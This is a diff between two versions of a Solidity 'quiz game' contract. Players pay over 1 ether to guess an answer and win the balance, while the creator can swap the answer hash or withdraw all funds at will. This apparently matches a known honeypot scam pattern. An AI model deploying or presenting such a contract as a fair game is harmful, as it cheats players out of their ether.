@@ -1,15 +1,16 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract QUIZ_GAME at 0xF0344800bd3Ffa687e4D780357961B28995a5F46
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract quiz_game at 0x1e4122413c436a294b11ad238e2293de633f2581
 */
-pragma solidity ^0.4.21;
+pragma solidity ^0.4.20;
 
-contract QUIZ_GAME
+contract quiz_game
 {
-    function Play(string _response)
+    function Try(string _response)
     external
     payable
     {
         require(msg.sender == tx.origin);
+        
         if(responseHash == keccak256(_response) && msg.value>1 ether)
         {
             msg.sender.transfer(this.balance);
@@ -22,14 +23,16 @@ contract QUIZ_GAME
   
     bytes32 responseHash;
  
-    function StartGame(string _question,string _response)
+    function start_quiz_game(string _question,string _response)
     public
     payable
     {
         if(responseHash==0x0)
         {
             responseHash = keccak256(_response);
+            
             question = _question;
+            
             questionSender = msg.sender;
         }
     }
@@ -39,6 +42,7 @@ contract QUIZ_GAME
     payable
     {
        require(msg.sender==questionSender);
+       
        msg.sender.transfer(this.balance);
     }
     
@@ -47,7 +51,9 @@ contract QUIZ_GAME
     payable
     {
         require(msg.sender==questionSender);
+        
         question = _question;
+        
         responseHash = _responseHash;
     }
     
